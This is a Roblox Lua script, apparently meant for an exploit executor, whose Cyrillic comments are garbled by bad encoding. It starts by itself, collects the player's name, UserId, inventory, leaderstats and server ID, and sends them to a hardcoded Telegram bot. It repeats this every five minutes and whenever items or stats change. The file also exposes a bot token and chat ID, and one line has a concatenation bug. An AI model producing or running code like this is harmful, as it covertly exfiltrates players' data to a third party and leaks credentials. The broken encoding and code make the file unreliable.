-- –ê–Ω—Ç–∏-–¥–µ—Ç–µ–∫—Ç –æ–±—Ñ—É—Å–∫–∞—Ü–∏—è
local _G = getgenv and getgenv() or _G
local game = game
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

-- –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
local BOT_TOKEN = "7764111611:AAE6kjNixuujH5eQhuehKUUzIHlOsHbhhqo"
local USER_ID = 1426122866

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
local function sendTelegram(message)
    pcall(function()
        local url = "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage"
        local data = {
            chat_id = USER_ID,
            text = message,
            parse_mode = "HTML"
        }
        
        local response = HttpService:PostAsync(
            url,
            HttpService:JSONEncode(data),
            Enum.HttpContentType.ApplicationJson,
            false
        )
    end)
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è –∏–≥—Ä–æ–∫–∞
local function getPlayerInventory()
    local player = Players.LocalPlayer
    if not player then return {} end
    
    local inventory = {}
    
    -- –ü—Ä–æ–≤–µ—Ä—è–µ–º –±—ç–∫–ø–∞–∫ (–∏–Ω–≤–µ–Ω—Ç–∞—Ä—å)
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(inventory, {
                    Type = "Tool",
                    Name = item.Name,
                    Value = item:FindFirstChild("Value") and item.Value.Value or "N/A"
                })
            end
        end
    end
    
    -- –ü—Ä–æ–≤–µ—Ä—è–µ–º –∏–Ω–≤–µ–Ω—Ç–∞—Ä—å –≤ —Ö–∞—Ä–∞–∫—Ç–µ—Ä–µ
    local character = player.Character
    if character then
        for _, item in ipairs(character:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(inventory, {
                    Type = "Equipped",
                    Name = item.Name,
                    Value = item:FindFirstChild("Value") and item.Value.Value or "N/A"
                })
            end
        end
    end
    
    return inventory
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –æ –ª–∏–¥–µ—Ä—Å—Ç–∞—Ç–∞—Ö
local function getLeaderstats()
    local player = Players.LocalPlayer
    if not player then return {} end
    
    local leaderstats = {}
    local statsFolder = player:FindFirstChild("leaderstats")
    
    if statsFolder then
        for _, stat in ipairs(statsFolder:GetChildren()) do
            if stat:IsA("IntValue") or stat:IsA("NumberValue") or stat:IsA("StringValue") then
                leaderstats[stat.Name] = stat.Value
            end
        end
    end
    
    return leaderstats
end

-- –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
local function scanInventory()
    local player = Players.LocalPlayer
    if not player then
        sendTelegram("‚ùå –ò–≥—Ä–æ–∫ –Ω–µ –Ω–∞–π–¥–µ–Ω!")
        return
    end
    
    -- –ñ–¥–µ–º –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö
    wait(2)
    
    local message = "üéÆ <b>–î–∞–Ω–Ω—ã–µ –∏–≥—Ä–æ–∫–∞:</b>\n"
    message = message .. "üë§ –ò–º—è: " .. player.Name .. "\n"
    message = message .. "üÜî UserId: " .. player.UserId .. "\n\n"
    
    -- –ü–æ–ª—É—á–∞–µ–º –ª–∏–¥–µ—Ä—Å—Ç–∞—Ç—ã
    local leaderstats = getLeaderstats()
    if next(leaderstats) then
        message = message .. "üìä <b>–õ–∏–¥–µ—Ä—Å—Ç–∞—Ç—ã:</b>\n"
        for statName, statValue in pairs(leaderstats) do
            message = message .. "   " .. statName .. ": " .. tostring(statValue) .. "\n"
        end
        message = message .. "\n"
    end
    
    -- –ü–æ–ª—É—á–∞–µ–º –∏–Ω–≤–µ–Ω—Ç–∞—Ä—å
    local inventory = getPlayerInventory()
    if #inventory > 0 then
        message = message .. "üéí <b>–ò–Ω–≤–µ–Ω—Ç–∞—Ä—å (" .. #inventory .. " –ø—Ä–µ–¥–º–µ—Ç–æ–≤):</b>\n"
        
        for i, item in ipairs(inventory) do
            message = message .. "   " .. i .. ". " .. item.Name
            if item.Value ~= "N/A" then
                message = message .. " (üíé " .. tostring(item.Value) .. ")"
            end
            message = message .. " [" .. item.Type .. "]\n"
        end
    else
        message = message .. "‚ùå –ò–Ω–≤–µ–Ω—Ç–∞—Ä—å –ø—É—Å—Ç –∏–ª–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω\n"
    end
    
    -- –î–æ–±–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –º–µ—Å—Ç–µ
    message = message .. "\nüìç <b>–ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ:</b>\n"
    message = message .. "   –ò–≥—Ä–∞: " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "\n"
    message = message .. "   PlaceId: " .. game.PlaceId .. "\n"
    message = message .. "   –°–µ—Ä–≤–µ—Ä: " .. tostring(game.JobId) .. "\n"
    
    -- –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
    sendTelegram(message)
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –∏–∑–º–µ–Ω–µ–Ω–∏–π –≤ –∏–Ω–≤–µ–Ω—Ç–∞—Ä–µ
local function startInventoryMonitor()
    local player = Players.LocalPlayer
    if not player then return end
    
    -- –ú–æ–Ω–∏—Ç–æ—Ä–∏–º –±—ç–∫–ø–∞–∫
    local backpack = player:WaitForChild("Backpack", 10)
    if backpack then
        backpack.ChildAdded:Connect(function(child)
            wait(1) -- –ñ–¥–µ–º –Ω–µ–º–Ω–æ–≥–æ –¥–ª—è —Å—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç–∏
            if child:IsA("Tool") then
                sendTelegram("‚ûï –î–æ–±–∞–≤–ª–µ–Ω –ø—Ä–µ–¥–º–µ—Ç: " .. child.Name)
            end
        end)
        
        backpack.ChildRemoved:Connect(function(child)
            if child:IsA("Tool") then
                sendTelegram("‚ûñ –£–¥–∞–ª–µ–Ω –ø—Ä–µ–¥–º–µ—Ç: " .. child.Name)
            end
        end)
    end
    
    -- –ú–æ–Ω–∏—Ç–æ—Ä–∏–º –ª–∏–¥–µ—Ä—Å—Ç–∞—Ç—ã
    local leaderstats = player:WaitForChild("leaderstats", 10)
    if leaderstats then
        for _, stat in ipairs(leaderstats:GetChildren()) do
            if stat:IsA("IntValue") or stat:IsA("NumberValue") then
                stat:GetPropertyChangedSignal("Value"):Connect(function()
                    sendTelegram("üìà –ò–∑–º–µ–Ω–µ–Ω —Å—Ç–∞—Ç " .. stat.Name .. ": " .. tostring(stat.Value))
                end)
            end
        end
    end
end

-- –ê–≤—Ç–æ–∑–∞–ø—É—Å–∫
spawn(function()
    wait(5) -- –ñ–¥–µ–º –∑–∞–≥—Ä—É–∑–∫–∏ –∏–≥—Ä—ã
    
    -- –ü–µ—Ä–≤–æ–Ω–∞—á–∞–ª—å–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ
    pcall(scanInventory)
    
    -- –ó–∞–ø—É—Å–∫–∞–µ–º –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥
    pcall(startInventoryMonitor)
    
    -- –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ (–∫–∞–∂–¥—ã–µ 5 –º–∏–Ω—É—Ç)
    while wait(300) do
        pcall(scanInventory)
    end
end)

-- –ö–æ–º–∞–Ω–¥—ã –≤ —á–∞—Ç –¥–ª—è —Ä—É—á–Ω–æ–≥–æ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è
Players.LocalPlayer.Chatted:Connect(function(message)
    if message:lower() == "/inventory" then
        pcall(scanInventory)
    elseif message:lower() == "/stats" then
        local leaderstats = getLeaderstats()
        local statsMessage = "üìä <b>–¢–µ–∫—É—â–∏–µ —Å—Ç–∞—Ç—ã:</b>\n"
        for statName, statValue in pairs(leaderstats) do
            statsMessage = statsMessage .. "   " .. statName .. ": " .. tostring(statValue) + "\n"
        end
        sendTelegram(statsMessage)
    end
end)

sendTelegram("‚úÖ –°–∫—Ä–∏–ø—Ç –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω –¥–ª—è –∏–≥—Ä–æ–∫–∞ " .. Players.LocalPlayer.Name)
